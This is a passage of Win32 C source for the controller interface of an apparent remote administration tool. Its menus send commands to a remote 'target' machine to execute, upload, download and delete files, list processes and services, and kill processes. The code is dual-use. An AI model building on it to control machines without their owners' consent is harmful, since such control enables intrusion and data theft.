                    AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_UPLOAD_FILE,"Upload File");
                    SetMenuItemBitmaps(hmenu,IDC_UPLOAD_FILE,MF_BITMAP,hTMBitMap1,hTMBitMap1);


                   if(strstr(CopynPasteON,"OFF"))
                   {
                    EnableMenuItem(hmenu,IDC_PASTE_FILE,MF_DISABLED|MF_GRAYED);
                   }

                   TrackPopupMenu(hmenu/*TrackPopup*/, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.y, pt.y, 0, hwndfDlg, NULL);

                    break;
                }

                flag=1;


                GetClientRect(hwndfDlg, (LPRECT) &rc);

                // Get the client coordinates for the mouse click.
                GetCursorPos(&pt);
                pt.y += 15;
                pt.x += 15;


                hmenu = CreatePopupMenu(); //= LoadMenu(fInst, MAKEINTRESOURCE(ID_FILE_MENU));

                /*if (hmenu == NULL)
                {
                    break;
                }*/
                // Get the first shortcut menu in the menu template. This is the
                // menu that TrackPopupMenu displays.
                hmenuTrackPopup = CreateMenu(); //GetSubMenu(hmenu, 0);


                AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_EXECUTE_FILE,"Execute");
                SetMenuItemBitmaps(hmenu,IDC_EXECUTE_FILE,MF_BITMAP,hTMBitMap8,hTMBitMap8);
                AppendMenu(hmenu, MF_SEPARATOR,IDC_SEP1,"");
                AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_COPY_FILE,"Copy");
                SetMenuItemBitmaps(hmenu,IDC_COPY_FILE,MF_BITMAP,hTMBitMap5,hTMBitMap5);
                AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_PASTE_FILE,"Paste");
                SetMenuItemBitmaps(hmenu,IDC_PASTE_FILE,MF_BITMAP,hTMBitMap6,hTMBitMap6);
                AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_RENAME_FILE,"Rename");
                SetMenuItemBitmaps(hmenu,IDC_RENAME_FILE,MF_BITMAP,hTMBitMap7,hTMBitMap7);
                AppendMenu(hmenu, MF_STRING|MF_POPUP,(UINT)hmenuTrackPopup,"New");
                AppendMenu(hmenuTrackPopup,MF_STRING,IDC_NEW_FOLDER,"Folder");
                SetMenuItemBitmaps(hmenuTrackPopup,IDC_NEW_FOLDER,MF_BITMAP,hTMBitMap3,hTMBitMap3);
                AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_DELETE_FILE,"Delete");
                SetMenuItemBitmaps(hmenu,IDC_DELETE_FILE,MF_BITMAP,hTMBitMap4,hTMBitMap4);
                AppendMenu(hmenu, MF_SEPARATOR,IDC_SEP1,"");
                AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_DOWNLOAD_FILE,"Download");
                SetMenuItemBitmaps(hmenu,IDC_DOWNLOAD_FILE,MF_BITMAP,hTMBitMap2,hTMBitMap2);
                AppendMenu(hmenu, MF_SEPARATOR,IDC_SEP1,"");
                AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_UPLOAD_FILE,"Upload File");
                SetMenuItemBitmaps(hmenu,IDC_UPLOAD_FILE,MF_BITMAP,hTMBitMap1,hTMBitMap1);


                if(strstr(DownloadON,"ON"))
                {
                    EnableMenuItem(hmenu,IDC_DOWNLOAD_FILE,MF_DISABLED|MF_GRAYED);
                }

                if(strstr(UploadON,"ON"))
                {
                    EnableMenuItem(hmenu,IDC_UPLOAD_FILE,MF_DISABLED|MF_GRAYED);
                }


                if(strstr(CopynPasteON,"OFF"))
                {
                    EnableMenuItem(hmenu,IDC_PASTE_FILE,MF_DISABLED|MF_GRAYED);
                }

                TrackPopupMenu(hmenu/*TrackPopup*/, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.y, pt.y, 0, hwndfDlg, NULL);




                memset(&LvItem2,0,sizeof(LvItem2));
                LvItem2.mask=LVIF_TEXT;
                LvItem2.iSubItem=0;
                LvItem2.pszText=FTemp;
                LvItem2.cchTextMax=256;
                LvItem2.iItem=iSlected;

                SendMessage(hList2,LVM_GETITEMTEXT,
                            iSlected, (LPARAM)&LvItem2);

                //sprintf(TTemp1,Text);
                //strcpy()
                ZeroMemory(&SEND.FileName[0],sizeof(SEND.FileName));
                lstrcpy(SEND.FileName,FinalDir);
                strcat(SEND.FileName,FTemp);


                /*ofstream file("test.txt",ios::app);
                file<<SEND.FileName<<endl;
                file.close();*/

            }

        }
        break;


        case IDC_LIST4:
        {
            if(((LPNMHDR)lParam)->code == NM_RCLICK)
            {

                int iSlected=0;

                iSlected=SendMessage(hList4,LVM_GETNEXTITEM,-1,LVNI_SELECTED);
                if(iSlected==-1)
                {
                    break;
                }

                flag=1;

                GetClientRect(hwndfDlg, (LPRECT) &rc);

                // Get the client coordinates for the mouse click.
                GetCursorPos(&pt);
                pt.y += 15;
                pt.x += 15;

                hmenu = LoadMenu(fInst, MAKEINTRESOURCE(ID_INSTALLED_MENU));


                if (hmenu == NULL)
                {
                    break;
                }
                // Get the first shortcut menu in the menu template. This is the
                // menu that TrackPopupMenu displays.
                hmenuTrackPopup = GetSubMenu(hmenu, 0);
                TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.y, pt.y, 0, hwndfDlg, NULL);


                memset(&LvItem2,0,sizeof(LvItem2));
                LvItem2.mask=LVIF_TEXT;
                LvItem2.iSubItem=1;
                LvItem2.pszText=FTemp3;
                LvItem2.cchTextMax=256;
                LvItem2.iItem=iSlected;

                SendMessage(hList4,LVM_GETITEMTEXT,
                            iSlected, (LPARAM)&LvItem2);

                //sprintf(TTemp1,Text);
                lstrcpy(SEND.Ipath,FTemp3);


            }

        }
        break;



        case IDC_TREE1:
        {

            if(((LPNMHDR)lParam)->code == NM_DBLCLK)
            {
                memset(&tvi,0,sizeof(tvi));
                Selected=(HTREEITEM)SendDlgItemMessage(hwndFile,
                                                       IDC_TREE1,TVM_GETNEXTITEM,TVGN_CARET,(LPARAM)Selected);

                TreeView_EnsureVisible(hwndFile,Selected);
                SendDlgItemMessage(hwndFile,IDC_TREE1,
                                   TVM_SELECTITEM,TVGN_CARET,(LPARAM)Selected);

                flagSelected=true;
                tvi.mask=TVIF_TEXT;
                tvi.pszText=FTemp2;
                tvi.cchTextMax=256;
                tvi.hItem=Selected;

                if(SendDlgItemMessage(hwndFile,IDC_TREE1,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
                {

                    /*if(flagSelected==true)
                    {
                    if(tvi.cChildren==0)
                    SendDlgItemMessage(hwndfDlg,IDC_TREE1,
                    TVM_DELETEITEM,TVGN_CHILD,(LPARAM)tvi.hItem);

                    flagSelected=false;
                    }*/          SendMessage(hList2,LVM_DELETEALLITEMS,0,0);

                    DeleteChild(hwndfDlg, IDC_TREE1, Selected);

                    /*if(strstr(FTemp2,":"))
                    {

                     strcat(FTemp2,"\\");
                     strcpy(SEND.Dpath,FTemp2);
                     SEND.PacketType = REQ_FILES;
                     SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);

                    }


                    else
                    {*/
                     GetParentFileDir(hwndfDlg, Selected, FTemp2, TargetID);
                   // }



                }
            }
        }
        break;


        }

    }
    return TRUE;




    // case WM_CTLCOLORDLG:
    // return (LONG)g_hbrBackground;





    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {
        case IDC_EXECUTE_FILE:
        {
            SEND.PacketType = EXECUTE_FILE;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Execute file");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;


        case IDC_CLEAR_LOG:
        {

        }
        break;


        case IDC_DOWNLOAD_FILE:
        {
            InitSettings();
            // EnableMenuItem(hmenuTrackPopup, IDC_EXECUTE_FILE, MF_BYCOMMAND | (EnableFlag ? /*MF_ENABLED*/MF_DISABLED : MF_GRAYED));
            if(strstr(isDLPathON,"ON"))
            {
               lstrcpy(DLdir,DLPathDB);
            }

            else
            {
                BROWSEINFO bInfo;
                bInfo.hwndOwner=hwndfDlg;
                bInfo.pidlRoot=NULL;
                bInfo.pszDisplayName=DLdir;
                bInfo.lpszTitle="Choose destination path";
                bInfo.ulFlags=BIF_RETURNONLYFSDIRS|BIF_NEWDIALOGSTYLE;
                bInfo.lpfn=NULL;
                bInfo.lParam=0;
                bInfo.iImage=-1;

                LPITEMIDLIST lpItem = SHBrowseForFolder(&bInfo);

                if(lpItem != NULL)
                {
                 SHGetPathFromIDList(lpItem,DLdir);
                }

                else
                {
                    break;
                }
            }

            //CreateDirectory(DLdir, NULL);
            //if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS);
            ZeroMemory(&DLfilename[0],sizeof(&DLfilename));
            strcat(DLfilename,DLdir);
            strcat(DLfilename,"\\");
            strcat(DLfilename,FTemp);


            // DialogBox(GetModuleHandle(NULL),MAKEINTRESOURCE(DLOAD_STAT_DLG), hwndDLstat, DLSTATUS_DlgProc);
            //EnableMenuItem(TrackPopupMenu,IDC_EXECUTE_FILE,MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
            if(strstr(ShowDloadWindow,"ON"))
            {
            CreateThread(NULL, 0,DLSTATWindow,(LPVOID)lParam, 0,0);
            }

            sprintf(DownloadON,"%s","ON");
            sprintf(DLLogUsrname,"%s", MTemp);
            Sleep(1);

            SEND.PacketType = DOWNLOAD_FILE;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            //MessageBox(NULL,FinalDir,"",NULL);

            GetTime();
            sprintf(LTaskName, "%s","Download file");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);


        }
        break;


        case IDC_DELETE_FILE:
        {

            strcpy(DLTfilename,FinalDir);
            strcat(DLTfilename,FTemp);

            strcpy(SEND.FileName,DLTfilename);

            SEND.PacketType = DELETE_FILE;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();
            SendMessage(hList2,LVM_DELETEALLITEMS,0,0);
            Sleep(5);

            strcpy(SEND.Dpath,FinalDir);
            SEND.PacketType = REQ_FILES;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Delete file");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_IEXECUTE_FILE:
        {
            SEND.PacketType = IEXECUTE_FILE;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Program Execute");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            //setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_IDOWNLOAD_FILE:
        {
            SEND.PacketType = IDOWNLOAD_FILE;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Program Download");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            //setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_IDELETE_FILE:
        {
            SEND.PacketType = IDELETE_FILE;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Program Delete");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            //setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_FSEARCH_BUTTON:
        {
            //GetDlgItemText(hwndfDlg,ID_SEARCH_EDIT,SEND.SearchDir,sizeof(SEND.SearchDir)+1);
            GetDlgItemText(hwndfDlg,ID_SEARCH_EDIT,SEND.SearchFile,sizeof(SEND.SearchFile)+1);
            lstrcpy(SEND.SearchDir,FinalDir);

            if((lstrlen(SEND.SearchDir) && lstrlen(SEND.SearchFile))==0)
            {
                MessageBox(hwndfDlg,"Field cannot be empty \n Directory not specified","ERROR",MB_OK|MB_ICONERROR);
                return 0;
            }

            if((lstrlen(SEND.SearchDir))==0)
            {
                MessageBox(hwndfDlg,"Directory not Specified","ERROR",MB_OK|MB_ICONERROR);
                return 0;
            }

            if((lstrlen(SEND.SearchFile))==0)
            {
                MessageBox(hwndfDlg,"Field cannot be empty","ERROR",MB_OK|MB_ICONERROR);
                return 0;
            }

            SEND.PacketType = REQ_FILE_SEARCH;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            SendMessage(hList2,LVM_DELETEALLITEMS,0,0);

            GetTime();
            sprintf(LTaskName, "%s","Search file");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;


        case IDC_NEW_FOLDER:
        {
            DialogBox(GetModuleHandle(NULL),MAKEINTRESOURCE(NEW_FOLDER_DLG), hwndFile, NewFolder_DlgProc);

        }
        break;

        case IDC_RENAME_FILE:
        {
            GetTime();
            sprintf(LTaskName, "%s","Rename file");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);
        }
        break;

        case IDC_COPY_FILE:
        {
            ZeroMemory(&Copy[0],sizeof(Copy));
            ZeroMemory(&CPfilename[0],sizeof(CPfilename));
            strcpy(CPfilename,FTemp);
            strcpy(Copy,FinalDir);
            strcat(Copy,CPfilename);

            lstrcpy(CopynPasteON,"ON");

            GetTime();
            sprintf(LTaskName, "%s","Copy file");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_PASTE_FILE:
        {
            ZeroMemory(&Paste[0],sizeof(Paste));
            strcpy(Paste,FinalDir);
            strcat(Paste,CPfilename);

            lstrcpy(SEND.Fpaste,Paste);
            lstrcpy(SEND.Fcopy,Copy);

            SEND.PacketType = COPYnPASTE_FILE;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            //MessageBox(NULL,Paste,"TEST",MB_OK | MB_ICONINFORMATION);

            Sleep(1);

            SendMessage(hList2,LVM_DELETEALLITEMS,0,0);

            strcpy(SEND.Dpath,FinalDir);
            SEND.PacketType = REQ_FILES;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Paste file");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_UPLOAD_FILE:
        {
            FileUloadHandle = CreateThread(NULL, 0,FILEUPLOAD,(LPVOID)"", 0, &thread);

            GetTime();
            sprintf(LTaskName, "%s","Upload file");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);
        }
        break;

        }
    }
    return TRUE;

    case WM_CLOSE:
    {
        //ExitProcess(0);
        EndDialog(hwndfDlg,0);

        GetTime();
        sprintf(LTaskName, "%s","Close File Manager");
        sprintf(LStatus, "%s","pass");
        sprintf(LUserName, "%s", MTemp);

        //setlog(LTaskName,LUserName,Time,1);

    }
    return TRUE;

    }
    return FALSE;
}


DWORD WINAPI FileWindow(LPVOID lpParam)
{

    hwndFile = CreateDialog(fInst,(LPCTSTR)File_Dlg,NULL,(DLGPROC)File_DlgProc);
    ShowWindow(hwndFile,SW_SHOW);

    SendMessage(hwndFile, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndFile, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));




    MSG msg;
    while(GetMessage(&msg,hwndFile,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}



BOOL CALLBACK Task_DlgProc(HWND hwndtDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    char TTemp[255]= {0};
    RECT rc;    // client area
    POINT  pt;   // location of mouse click


    switch(uMsg)
    {
    case WM_INITDIALOG:
    {

        InitCommonControls(); // make our tree control to work

        hStatus3 = CreateWindowEx(0, STATUSCLASSNAME,
                                  NULL, WS_CHILD | WS_VISIBLE |
                                  SBARS_SIZEGRIP, 0,0,0,0,hwndtDlg,
                                  (HMENU) IDC_TASK_STATUS,
                                  GetModuleHandle(NULL), NULL);
        SendMessage(hStatus3, SB_SETPARTS, 2, (LPARAM)statwidths);


        hTabControl2 = GetDlgItem(hwndtDlg,TASK_MAIN_TAB);

        TCITEM ti;
        ti.mask = TCIF_TEXT | TCIF_IMAGE; // I'm only having text & Image on the tab
        ti.pszText = "Applications";
        TabCtrl_InsertItem(hTabControl2,0,&ti);
        ti.pszText = "Processes";
        TabCtrl_InsertItem(hTabControl2,1,&ti);
        ti.pszText = "Services";
        TabCtrl_InsertItem(hTabControl2,2,&ti);
        TabCtrl_SetCurSel(hTabControl2,0);





        ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST3),SW_HIDE);
        ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST5),SW_SHOW);


        hList3=GetDlgItem(hwndtDlg,IDC_LIST3);


        memset(&LvCol2,0,sizeof(LvCol2));                  // Zero Members
        LvCol2.cx=0;                                   // width between each coloum
// Inserting Couloms as much as we want

        ListView_SetExtendedListViewStyle(hList3, exStyles);

        LvCol2.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol2.cx=170;                                   // width of column
        LvCol2.pszText="Process";                            // First Header Text
        SendMessage(hList3,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=80;                                   // width of column
        LvCol2.pszText="PID";                            // Next coloum
        SendMessage(hList3,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol2); // ...
        LvCol2.cx=70;                                   // width of column
        LvCol2.pszText="Threads";                            // Next coloum
        SendMessage(hList3,LVM_INSERTCOLUMN,2,(LPARAM)&LvCol2); // ...
        memset(&LvItem2,0,sizeof(LvItem2)); // Zero struct's Members
        LvCol2.cx=90;                                   // width of column
        LvCol2.pszText="Parent PID";                            // Next coloum
        SendMessage(hList3,LVM_INSERTCOLUMN,3,(LPARAM)&LvCol2); // ...
        LvCol2.cx=80;                                   // width of column
        LvCol2.pszText="Priority";                            // Next coloum
        SendMessage(hList3,LVM_INSERTCOLUMN,4,(LPARAM)&LvCol2); // ...

        LvItem2.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem2.cchTextMax = 256; // Max size of test
        LvItem2.iItem=0;          // choose item
        LvItem2.iSubItem=0;       // Put in first coluom



        hList5=GetDlgItem(hwndtDlg,IDC_LIST5);

        memset(&LvCol2,0,sizeof(LvCol2));                  // Zero Members
        LvCol2.cx=0x28;                                   // width between each coloum

        LvCol2.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol2.cx=520;                                   // width of column
        LvCol2.pszText="Windows";                            // First Header Text
        SendMessage(hList5,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol2); // Insert/Show the coloum

        LvItem2.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem2.cchTextMax = 256; // Max size of test
        LvItem2.iItem=0;          // choose item
        LvItem2.iSubItem=0;       // Put in first coluom
        SendMessage(hList5,LVM_SETEXTENDEDLISTVIEWSTYLE,
                    0,LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES); // Set style

        SEND.PacketType = REQ_WINDOWS;
        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
        SendDataKB+=SSizeKB;
        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
        UpdateStats();



        hList9=GetDlgItem(hwndtDlg,IDC_LIST9);


        memset(&LvCol2,0,sizeof(LvCol2));                  // Zero Members
        LvCol2.cx=0;                                   // width between each coloum
// Inserting Couloms as much as we want

        ListView_SetExtendedListViewStyle(hList9, exStyles);

        LvCol2.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol2.cx=150;                                   // width of column
        LvCol2.pszText="Service Name";                            // First Header Text
        SendMessage(hList9,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=170;                                   // width of column
        LvCol2.pszText="Description";                            // Next coloum
        SendMessage(hList9,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol2); // ...
        LvCol2.cx=90;                                   // width of column
        LvCol2.pszText="Status";                            // Next coloum
        SendMessage(hList9,LVM_INSERTCOLUMN,2,(LPARAM)&LvCol2); // ...
        memset(&LvItem2,0,sizeof(LvItem2)); // Zero struct's Members
        LvCol2.cx=90;                                   // width of column
        LvCol2.pszText="Startup";                            // Next coloum
        SendMessage(hList9,LVM_INSERTCOLUMN,3,(LPARAM)&LvCol2); // ...

        LvItem2.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem2.cchTextMax = 256; // Max size of test
        LvItem2.iItem=0;          // choose item
        LvItem2.iSubItem=0;       // Put in first coluom

        ListView_SetImageList(GetDlgItem(hwndTask, IDC_LIST5),TImageList, LVSIL_SMALL);
        ListView_SetImageList(GetDlgItem(hwndTask, IDC_LIST9),TImageList, LVSIL_SMALL);






    }
    return TRUE;



    case WM_NOTIFY:
    {
        HMENU hmenu;
        HMENU hmenuTrackPopup;

        switch (((LPNMHDR)lParam)->code)
        {
        case TCN_SELCHANGE:
        {
            int iPage = TabCtrl_GetCurSel(GetDlgItem(hwndtDlg, TASK_MAIN_TAB));

            switch(iPage)
            {
            case 0:
                SendMessage(hList5,LVM_DELETEALLITEMS,0,0);

                ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST5 ),SW_SHOW);
                ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST3 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST9 ),SW_HIDE);

                SEND.PacketType = REQ_WINDOWS;
                SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                SendDataKB+=SSizeKB;
                SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                UpdateStats();

                GetTime();
                sprintf(LTaskName, "%s","Applications");
                sprintf(LStatus, "%s","pass");
                sprintf(LUserName, "%s", MTemp);

                //setlog(LTaskName,LUserName,Time,1);

                break;

            case 1:
                SendMessage(hList3,LVM_DELETEALLITEMS,0,0);

                ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST5 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST3 ),SW_SHOW);
                ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST9 ),SW_HIDE);

                SEND.PacketType = REQ_TASKS;
                SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                SendDataKB+=SSizeKB;
                SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                UpdateStats();

                GetTime();
                sprintf(LTaskName, "%s","Processes");
                sprintf(LStatus, "%s","pass");
                sprintf(LUserName, "%s", MTemp);

                //setlog(LTaskName,LUserName,Time,1);

                break;

            case 2:
                SendMessage(hList9,LVM_DELETEALLITEMS,0,0);

                ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST5 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST3 ),SW_HIDE);
                ShowWindow(GetDlgItem(hwndtDlg, IDC_LIST9 ),SW_SHOW);

                SEND.PacketType = REQ_SRVCS;
                SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                SendDataKB+=SSizeKB;
                SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                UpdateStats();

                GetTime();
                sprintf(LTaskName, "%s","Services");
                sprintf(LStatus, "%s","pass");
                sprintf(LUserName, "%s", MTemp);

                //setlog(LTaskName,LUserName,Time,1);

                break;



            }

        }
        break;
        }




        switch(LOWORD(wParam))
        {
        case IDC_LIST3:
        {
            if(((LPNMHDR)lParam)->code == NM_RCLICK)
            {
                int iSlected=0;

                iSlected=SendMessage(hList3,LVM_GETNEXTITEM,-1,LVNI_SELECTED);

                if(iSlected==-1)
                {
                    break;
                }

                flag=1;


                GetClientRect(hwndtDlg, (LPRECT) &rc);

                // Get the client coordinates for the mouse click.
                GetCursorPos(&pt);
                pt.y += 10;
                pt.x += 10;

                HBITMAP hTBitMap1 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_CANCEL));
                HBITMAP hTBitMap2 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_REFRESH));


                hmenu = CreatePopupMenu(); //LoadMenu(tInst, MAKEINTRESOURCE(ID_TASK_MENU));

               /* if (hmenu == NULL)
                {
                    break;

                }*/
                // Get the first shortcut menu in the menu template. This is the
                // menu that TrackPopupMenu displays.
               // hmenuTrackPopup = GetSubMenu(hmenu, 0);


                AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_KILL_TASK,"Kill Process");
                SetMenuItemBitmaps(hmenu,IDC_KILL_TASK,MF_BITMAP,hTBitMap1,hTBitMap1);
                AppendMenu(hmenu, MF_SEPARATOR,IDC_SEP1,"");
                AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_REFRESH_TASK,"Refresh List");
                SetMenuItemBitmaps(hmenu,IDC_REFRESH_TASK,MF_BITMAP,hTBitMap2,hTBitMap2);

                 TrackPopupMenu(hmenu/*TrackPopup*/, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.y, pt.y, 0, hwndtDlg, NULL);


                memset(&LvItem2,0,sizeof(LvItem2));
                LvItem2.mask=LVIF_TEXT;
                LvItem2.iSubItem=0;
                LvItem2.pszText=TTemp;
                LvItem2.cchTextMax=256;
                LvItem2.iItem=iSlected;

                SendMessage(hList3,LVM_GETITEMTEXT,
                            iSlected, (LPARAM)&LvItem2);

                //sprintf(TTemp1,Text);
                lstrcpy(SEND.TaskName,TTemp);

            }

        }
        break;

        case IDC_LIST9:
        {
            if(((LPNMHDR)lParam)->code == NM_RCLICK)
            {
                int iSlected=0;

                iSlected=SendMessage(hList9,LVM_GETNEXTITEM,-1,LVNI_SELECTED);

                if(iSlected==-1)
                {
                    break;
                }

                flag=1;


                GetClientRect(hwndtDlg, (LPRECT) &rc);

                // Get the client coordinates for the mouse click.
                GetCursorPos(&pt);
                pt.y += 10;
                pt.x += 10;

                hmenu = LoadMenu(tInst, MAKEINTRESOURCE(ID_SERVICE_MENU));

                if (hmenu == NULL)
                {
                    break;

                }
                // Get the first shortcut menu in the menu template. This is the
                // menu that TrackPopupMenu displays.
                hmenuTrackPopup = GetSubMenu(hmenu, 0);
                TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.y, pt.y, 0, hwndtDlg, NULL);


                memset(&LvItem2,0,sizeof(LvItem2));
                LvItem2.mask=LVIF_TEXT;
                LvItem2.iSubItem=0;
                LvItem2.pszText=TTemp;
                LvItem2.cchTextMax=256;
                LvItem2.iItem=iSlected;

                SendMessage(hList9,LVM_GETITEMTEXT,
                            iSlected, (LPARAM)&LvItem2);

                //sprintf(TTemp1,Text);
                lstrcpy(SEND.SrvcName,TTemp);

            }

        }
        break;

        }


    }
    return TRUE;




    case WM_CTLCOLORDLG:
        return (LONG)g_hbrBackground;


    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {
        case IDC_KILL_TASK:
        {
            //lstrcpy(SEND.TaskName,TTemp);
            SEND.PacketType = KILL_PROCESS;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Kill process");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

        case IDC_REFRESH_TASK:
        {
            SendMessage(hList3,LVM_DELETEALLITEMS,0,0);
            SEND.PacketType = REQ_TASKS;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Refresh processes");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);

        }
        break;

